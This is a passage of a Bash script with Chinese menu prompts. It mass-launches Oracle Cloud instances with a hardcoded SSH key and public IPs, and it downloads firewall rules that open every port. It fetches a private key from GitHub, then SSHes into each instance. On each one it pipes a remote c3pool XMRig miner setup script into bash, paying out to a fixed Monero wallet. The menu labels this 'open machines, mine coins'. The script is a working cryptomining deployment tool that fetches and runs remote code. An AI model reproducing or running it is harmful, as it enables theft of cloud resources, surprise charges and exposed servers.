  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDB}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_12
}
function microb_e24() {
  print_ok " 第19台microb_e24 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_e24
}
function microb_e22() {
  print_ok " 第20台microb_e22 "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${email} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}'> /root/oracle/ip/microb_e22
}



function microc_14() {
  print_ok " 第21台microc_14 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDC}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_14
}
function microc_12() {
  print_ok " 第22台microc_12 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDC}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_12
}
function microc_e24() {
  print_ok " 第23台microc_e24 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_e24
}
function microc_e22() {
  print_ok " 第24台microc_e22 "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${email} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_e22
}


function get_ip() {
  rm -rf /root/oracle/ip.txt
  oci compute instance list-vnics > /root/oracle/ip/iplist
  iptext="/root/oracle/ip/iplist"
  pu=publicip
  sed -i "s/public-ip/${pu}/g" ${iptext}
 length=0 
 jq -c '.data[].publicip' /root/oracle/ip/iplist |  tr -d '"' | while read i; do
  ((length=length+1))
  echo -e  $i >> /root/oracle/ip.txt
  echo -e $length > /root/oracle/number.txt
  done
  mumber=$(cat /root/oracle/number.txt)
  echo -e $mumber

if [[ $mumber -gt 23 ]]
then
    cat /root/oracle/ip.txt
    wa_bi
else
    sleep 30s
	get_ip
fi

}

function pre_pare() {
  cd /root && rm -rf oracle && mkdir oracle && cd /root/oracle && mkdir network && mkdir image && mkdir ip
  yum install -y wget jq screen
}
function install() {
 availability_domain
 subnet
 imageid
 open_instance 
 get_ip
}


function wa_bi() {
  cd / && rm -rf data && mkdir data && chmod 700 data && cd /data && wget -N --no-check-certificate -q -O smithao https://raw.githubusercontent.com/gcp5678/config/main/smithao && chmod 600 smithao
  echo -e "—————————————— 私钥已设置 ——————————————"""
  oci compute instance list-vnics > /root/oracle/ip/iplist
  iptext="/root/oracle/ip/iplist"
  pu=publicip
  sed -i "s/public-ip/${pu}/g" ${iptext}
  text1="ssh -i /data/smithao  -o StrictHostKeyChecking=no ubuntu@"
  text2=\""curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46MVgvFXbVZNvpAKrQPSWgevqqANgadFGTq2ocvZ5SjkT7vmLdLyKJ5eUgZrstVLExM8Q9ZsPyuRECfTDEmf2EwVDTBfdpZ\""
  jq -c '.data[].publicip' /root/oracle/ip/iplist |  tr -d '"' | while read i; do
  test="${text1}$i ${text2}"
  echo -e  $test >> ip.sh 2>&1
  done
  chmod 755 ip.sh && nohup ./ip.sh >> out.txt 2>&1 &
}

function security_list() {
  oci network security-list list > /root/oracle/network/securitylist
  print_ok "—————————————— 获取--security-list-id—————————————— "
  SECURITYLISTAID=$(cat /root/oracle/network/securitylist | jq .data[2].id | tr -d '"')
  SECURITYLISTBID=$(cat /root/oracle/network/securitylist | jq .data[1].id | tr -d '"')
  SECURITYLISTCID=$(cat /root/oracle/network/securitylist | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 防火墙规则下载...—————————————— "
  cd /root/oracle/ && wget -N --no-check-certificate -q -O ingress-security-rules.json https://raw.githubusercontent.com/voyku/config/main/in-rules.json
  print_ok "—————————————— 下载完成，开始更新防火墙规则—————————————— "
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTAID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json 
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTBID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTCID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json
  print_ok "—————————————— 防火墙更新完成，端口已全部打开—————————————— "
}



menu() {
  echo -e "—————————————— 开机向导 ——————————————"""
  echo -e "${Green}0.${Font}  安装配置oci"
  echo -e "${Green}1.${Font}  开鸡挖币"
  read -rp "请输入数字：" menu_num
  case $menu_num in
  0)
  install
  ;;
  1)
  install_oci
  ;;
  esac
}
 menu "$@"


